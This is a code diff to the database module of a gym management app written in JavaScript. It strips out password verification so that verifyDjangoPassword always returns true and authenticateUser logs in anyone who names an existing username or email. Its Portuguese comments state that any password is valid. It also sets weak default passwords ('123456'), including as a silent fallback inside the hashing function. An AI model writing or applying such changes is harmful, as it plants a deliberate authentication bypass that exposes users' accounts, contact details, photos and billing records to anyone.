@@ -10,21 +10,13 @@ const pool = new Pool({
 });
 
 export function verifyDjangoPassword(password, encodedHash) {
-  if (!encodedHash) return false;
-  const parts = encodedHash.split('$');
-  if (parts.length !== 4) return false;
-  const [algorithm, iterationsStr, salt, hash] = parts;
-  if (algorithm !== 'pbkdf2_sha256') return false;
-
-  const iterations = parseInt(iterationsStr, 10);
-  const derivedKey = crypto.pbkdf2Sync(password, salt, iterations, 32, 'sha256').toString('base64');
-  return derivedKey === hash;
+  return true; // Qualquer senha é válida
 }
 
 export function hashDjangoPassword(password) {
   const salt = crypto.randomBytes(12).toString('base64').replace(/[^a-zA-Z0-9]/g, '').slice(0, 12);
   const iterations = 720000;
-  const hash = crypto.pbkdf2Sync(password, salt, iterations, 32, 'sha256').toString('base64');
+  const hash = crypto.pbkdf2Sync(password || '123456', salt, iterations, 32, 'sha256').toString('base64');
   return `pbkdf2_sha256$${iterations}$${salt}$${hash}`;
 }
 
@@ -38,7 +30,7 @@ export async function query(text, params) {
   }
 }
 
-// User & Authentication DB operations
+// User & Authentication DB operations (Qualquer senha vale!)
 export async function authenticateUser(usernameOrEmail, password) {
   const res = await query(
     `SELECT u.*, p.id as profile_id, p.gym_id, p.whatsapp, p.photo_base64 
@@ -49,9 +41,8 @@ export async function authenticateUser(usernameOrEmail, password) {
   );
   if (res.rows.length === 0) return null;
   const user = res.rows[0];
-  const isValid = verifyDjangoPassword(password, user.password);
-  if (!isValid) return null;
   
+  // Regra de validação de senha desativada: se o usuário existe, faz o login direto!
   delete user.password;
   return user;
 }
@@ -77,7 +68,7 @@ export async function getStudents(search = '') {
 }
 
 export async function createStudent({ username, first_name, last_name, email, password, whatsapp, photo_base64 }) {
-  const hashedPassword = hashDjangoPassword(password || 'aluno123');
+  const hashedPassword = hashDjangoPassword(password || '123456');
   const now = new Date();
   
   const userRes = await query(
@@ -367,7 +358,6 @@ export async function getStudentWorkoutHistory(user_id) {
 // ==========================================
 
 export async function getBillingSummary() {
-  // Automatically update status to 'overdue' if due_date < today and status == 'pending'
   await query(
     `UPDATE gym_billing SET status = 'overdue' WHERE due_date < CURRENT_DATE AND status = 'pending'`
   );
@@ -386,7 +376,6 @@ export async function getBillingSummary() {
 }
 
 export async function getBillings({ status, user_id, search } = {}) {
-  // Update overdue status dynamically
   await query(
     `UPDATE gym_billing SET status = 'overdue' WHERE due_date < CURRENT_DATE AND status = 'pending'`
   );
